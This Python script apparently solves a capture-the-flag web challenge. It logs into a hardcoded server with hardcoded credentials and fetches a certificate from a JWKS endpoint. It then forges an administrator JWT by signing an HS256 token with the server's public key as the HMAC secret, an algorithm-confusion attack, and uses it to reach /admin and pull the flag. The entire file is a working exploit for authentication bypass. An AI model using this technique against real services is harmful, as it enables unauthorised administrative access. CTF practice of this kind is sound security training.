import requests
import json
import base64
import hmac
import hashlib
import re
import sys
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

# Configuration
BASE_URL = "http://35.193.28.19:35631/"
USERNAME = "thala"
PASSWORD = "thala@123"

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    encoded = base64.urlsafe_b64encode(data).rstrip(b'=')
    return encoded.decode('utf-8')

def solve():
    s = requests.Session()

    # 1. Login to get a valid session
    print(f"[*] Logging in as {USERNAME}...")
    res = s.post(f"{BASE_URL}/login", data={"username": USERNAME, "password": PASSWORD})
    if res.status_code != 200:
        print("[-] Login failed")
        sys.exit(1)
    
    print("[+] Login successful")
    
    # 2. Get the certificate from the well-known endpoint
    print("[*] Fetching certificate from .well-known endpoint...")
    res = s.get(f"{BASE_URL}/.well-known/jwks.json")
    if res.status_code != 200:
        print("[-] Failed to get JWKS config")
        sys.exit(1)
    
    data = res.json()
    cert_pem = data.get("verification_cert")
    if not cert_pem:
        print("[-] Certificate not found in JWKS config")
        sys.exit(1)
        
    print("[+] Found certificate")

    # 3. Extract Public Key and KID from Certificate
    print("[*] Extracting Public Key and KID from Certificate...")
    try:
        cert = x509.load_pem_x509_certificate(cert_pem.encode(), default_backend())
        public_key = cert.public_key()
        public_key_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
        
        # Extract KID from Organizational Unit (OU)
        # The subject is a Name object, we iterate to find the OU attribute
        kid = None
        for attribute in cert.subject:
            if attribute.oid == x509.NameOID.ORGANIZATIONAL_UNIT_NAME:
                kid = attribute.value
                break
        
        if not kid:
            print("[-] KID not found in certificate OU field")
            sys.exit(1)
            
        print(f"[+] Public Key extracted. KID found: {kid}")
        
    except Exception as e:
        print(f"[-] Failed to extract data from cert: {e}")
        sys.exit(1)

    # 4. Forge the token manually
    print("[*] Forging admin token manually...")
    
    # TWIST 2: Must include the correct KID
    header = {
        "typ": "JWT",
        "alg": "HS256",
        "kid": kid 
    }
    payload = {
        "sub": "administrator",
        "iss": "DecoyKeyCTF"
    }
    
    encoded_header = base64url_encode(json.dumps(header, separators=(',', ':')))
    encoded_payload = base64url_encode(json.dumps(payload, separators=(',', ':')))
    
    signing_input = f"{encoded_header}.{encoded_payload}"
    
    # Sign using the public key as the secret
    signature = hmac.new(
        public_key_pem.encode('utf-8'),
        signing_input.encode('utf-8'),
        hashlib.sha256
    ).digest()
    print (signature)
    encoded_signature = base64url_encode(signature)
    
    forged_token = f"{signing_input}.{encoded_signature}"
    
    # 5. Access the admin page
    print("[*] Accessing admin page with forged token...")
    
    # Use a fresh request to avoid session cookie interference
    res = requests.get(f"{BASE_URL}/admin", cookies={"session": forged_token})
    
    if res.status_code == 200:
        print("[+] Admin access granted!")
        if "L3m0nctf{" in res.text:
            flag = re.search(r"L3m0nctf\{.*?\}", res.text).group(0)
            print(f"\n[SUCCESS] Flag found: {flag}\n")
        else:
            print("[-] Flag not found in response")
            print(res.text)
    else:
        print(f"[-] Admin access denied. Status: {res.status_code}")
        print(res.text)

if __name__ == "__main__":
    solve()
